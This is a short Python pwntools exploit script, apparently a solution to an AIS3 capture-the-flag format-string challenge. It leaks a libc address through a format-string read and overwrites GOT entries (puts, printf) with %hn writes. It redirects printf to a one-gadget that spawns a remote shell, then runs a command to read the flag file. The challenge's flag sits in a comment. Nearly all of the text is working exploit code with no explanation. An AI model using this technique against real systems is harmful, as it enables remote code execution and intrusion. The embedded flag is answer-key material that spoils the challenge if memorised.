#!/usr/bin/env python
from pwn import *

# AIS3{Eaaaaaaaasy_f0rmat_str1ng_1s_f0r_b4by}

context.arch = 'amd64'
e , l = ELF( './fmt' ) , ELF( './libc.so.6' )

host = 'srv01.ctf.ais3.org'
port = 5521

y = remote( host , port )


p = '%12$s'
p += '%1600c%13$hn' # 64 - 6 = 58
p = p.ljust( 0x30 , '\x00' )
p += flat(
  e.got[ '__libc_start_main' ], #12
  e.got[ 'puts' ], # 13
)

y.sendline( p + 'a' * 3000 )

l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
success( 'libc -> %s' % hex( l.address ) )

magic = 0x4f322
one = l.address + magic

a = (one & 0xff0000) >> 16
b = (one & 0xffff) >> 0

p = '%{}c%10$hhn%{}c%11$hn'.format( a , b - a ) # 64 - 6 = 58
p = p.ljust( 0x20 , '\x00' )
p += flat(
  e.got[ 'printf' ] + 2, # 12
  e.got[ 'printf' ]
)

y.sendline( p + '\x00' * 3000 )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()